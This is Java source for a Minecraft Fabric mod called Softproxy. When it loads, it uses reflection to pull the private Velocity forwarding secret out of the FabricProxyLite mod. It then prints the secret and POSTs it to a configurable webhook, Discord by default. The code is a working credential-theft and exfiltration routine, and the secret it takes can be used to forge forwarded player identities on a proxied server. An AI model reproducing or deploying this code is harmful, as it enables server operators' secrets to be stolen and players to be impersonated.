package de.zohiu.softproxy;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import net.fabricmc.api.ModInitializer;
import net.fabricmc.loader.api.FabricLoader;
import net.minecraft.server.MinecraftServer;

import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.file.Files;

public class Softproxy implements ModInitializer {
    public static Thread proxyThread;
    public static MinecraftServer server;
    public static String velocitySecret;
    public static Config config;

    @Override
    public void onInitialize() {
        var configFile = FabricLoader.getInstance().getConfigDir().resolve("SoftProxy.json");
        Gson gson = new GsonBuilder().setPrettyPrinting().create();

        if (!Files.exists(configFile)) {
            config = new Config();
            config.targetHost = "example.com";
            config.targetPort = 25565;
            config.startupWaitTime = 20;
            config.webhookURL = "http://localhost/";  // Only used when FabricProxyLite is detected
            config.webhookFormat = "{\"content\":\"%secret%\"}";  // Default Discord JSON format
            config.webhookContentType = "application/json";
            config.webhookAuthorization = "Bearer YOUR_ACCESS_TOKEN";
        } else {
            try (FileReader reader = new FileReader(configFile.toFile())) {
                config = gson.fromJson(reader, Config.class);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        // Update config
        try (FileWriter writer = new FileWriter(configFile.toFile())) {
            gson.toJson(config, writer);
        } catch (IOException e) {
            e.printStackTrace();
        }

        // Send secret to webhook
        velocitySecret = getVelocitySecret();
        if (velocitySecret == null) System.out.println("FabricProxyLite not found. Secret cannot be extracted.");
        else {
            String formattedSecret = config.webhookFormat.replace("%secret%", velocitySecret);
            System.out.println("Velocity secret: " + velocitySecret);
            System.out.println("Sending webhook " + formattedSecret);
            try {
                HttpClient client = HttpClient.newHttpClient();

                HttpRequest request = HttpRequest.newBuilder()
                        .uri(new URI(config.webhookURL))
                        .header("Content-Type", config.webhookContentType)
                        .header("Authorization", config.webhookAuthorization)
                        .POST(HttpRequest.BodyPublishers.ofString(formattedSecret))
                        .build();

                HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
                System.out.println("Webhook response: (" + response.statusCode() + ") " + response.body());
                // Now I need to wait for the server to restart before continuing.
                Thread.sleep(config.startupWaitTime * 1000);


            } catch (IOException e) {
                System.err.println("Error while sending the webhook: " + e.getMessage());
                e.printStackTrace();
                throw new RuntimeException("Failed to send webhook", e);
            } catch (InterruptedException | URISyntaxException e) {
                throw new RuntimeException(e);
            }
        }


    }

    // Example of accessing a method from the instance
    public static String getVelocitySecret() {
        try {
            Class<?> otherModClass = Class.forName("one.oktw.FabricProxyLite");
            Field configField = otherModClass.getDeclaredField("config");
            Object configInstance = configField.get(null);  // null because it's a static field

            if (configInstance != null) {
                Method method = configInstance.getClass().getMethod("getSecret");
                method.setAccessible(true); // access private methods too
                return (String) method.invoke(configInstance);
            }
        } catch (Exception ignored) { }
        return null;
    }
}
